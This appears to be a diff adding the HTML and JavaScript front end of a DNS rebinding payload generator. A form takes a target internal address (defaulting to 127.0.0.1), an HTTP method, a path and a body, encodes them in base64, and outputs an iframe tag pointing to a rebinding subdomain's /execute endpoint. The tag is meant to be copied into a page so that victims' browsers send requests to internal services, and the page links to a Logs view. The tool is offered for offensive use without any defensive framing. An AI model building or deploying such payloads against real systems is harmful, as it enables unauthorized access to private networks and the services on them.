@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DNS Rebinding - Payload Generator</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        .flx {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        #gen {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            width: 100%;
+        }
+
+        label {
+            padding: 10px;
+        }
+
+        button {
+            margin: 10px;
+            padding: 4px;
+            cursor: pointer;
+            transition: all ease-in-out 100ms;
+        }
+
+        button:active {
+            transform: translateY(2px);
+        }
+
+        select {
+            padding: 3px;
+            font-family: 'Courier New', Courier, monospace;
+            cursor: pointer;
+        }
+
+        .res {
+            margin-top: 20px;
+            display: none;
+        }
+
+        #rtxt {
+            background: rgba(102, 253, 102, 0.592);
+            padding: 3px;
+            border-radius: 2px;
+        }
+        a {
+            margin: 5px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+
+<body>
+    <form action="" id="f">
+        <div id="gen" class="flx">
+            <h3>DNS Rebinding Payload Generator</h3>
+            <label for="method">Method:</label>
+            <select name="method" id="method" required>
+                <option value="GET" selected>GET</option>
+                <option value="POST">POST</option>
+                <option value="HEAD">HEAD</option>
+                <option value="PUT">PUT</option>
+                <option value="PATCH">PATCH</option>
+                <option value="DELETE">DELETE</option>
+            </select>
+            <label for="address">Address:</label>
+            <input type="text" name="address" id="address" required placeholder="127.0.0.1">
+            <label for="path">Path:</label>
+            <input type="text" name="path" id="path" required placeholder="/">
+            <div class="flx" id="bi" style="display: none;">
+                <label for="body">Body:</label>
+                <textarea name="body" id="body" cols="30" rows="10"></textarea>
+            </div>
+            <div style="margin: 10px;" class="flx">
+                <label>Headers:</label>
+                <div>
+                    <input type="text" name="" placeholder="Key" id="">
+                    <input type="text" name="" id="">
+                    <button>+</button>
+                </div>
+            </div>
+            <a href="logs">Logs</a>
+            <button type="submit">Generate 🚀</button>
+            <div class="flx res" id="resdisplay">
+                <div id="rtxt">
+                    
+                </div>
+                <button type="button" id="copy">Copy 📋</button>
+            </div>
+        </div>
+    </form>
+</body>
+<script>
+    function fallbackCopyTextToClipboard(text) {
+        var textArea = document.createElement("textarea");
+        textArea.value = text;
+
+        // Avoid scrolling to bottom
+        textArea.style.top = "0";
+        textArea.style.left = "0";
+        textArea.style.position = "fixed";
+
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+
+        try {
+            var successful = document.execCommand('copy');
+            var msg = successful ? 'successful' : 'unsuccessful';
+            console.log('Fallback: Copying text command was ' + msg);
+        } catch (err) {
+            console.error('Fallback: Oops, unable to copy', err);
+        }
+
+        document.body.removeChild(textArea);
+    }
+    function copyTextToClipboard(text) {
+        if (!navigator.clipboard) {
+            fallbackCopyTextToClipboard(text);
+            return;
+        }
+        navigator.clipboard.writeText(text).then(function () {
+            console.log('Async: Copying to clipboard was successful!');
+        }, function (err) {
+            console.error('Async: Could not copy text: ', err);
+        });
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        document.getElementById('method').addEventListener('change', (e) => {
+            const bodyInput = document.getElementById('bi');
+            if (['GET', 'HEAD'].includes(e.target.value)) {
+                bodyInput.style.display = 'none';
+            } else {
+                bodyInput.style.display = 'flex';
+            }
+        });
+        const copy = document.getElementById('copy');
+        copy.addEventListener('click', (e) => {
+            copyTextToClipboard(document.getElementById('rtxt').textContent);
+            copy.textContent = 'Copied! ✔️';
+            setTimeout(() => {
+                copy.textContent = 'Copy 📋';
+            }, 1500);
+        });
+        document.getElementById('f').addEventListener('submit', (e) => {
+            e.preventDefault();
+            let obj = [
+                document.getElementById('method').value,
+                document.getElementById('path').value,
+                document.getElementById('body').value
+            ];
+            let config = btoa(JSON.stringify(obj));
+            let iframe = document.createElement('iframe');
+            iframe.src = `${window.location.protocol}//${document.getElementById('address').value.replaceAll('.', '-')}.${window.location.host}/execute?c=${encodeURIComponent(config)}`;
+            document.getElementById('rtxt').textContent = iframe.outerHTML;
+            iframe.remove();
+            document.getElementById('resdisplay').style.display = 'flex';
+        });
+    });
+</script>
+
+</html>
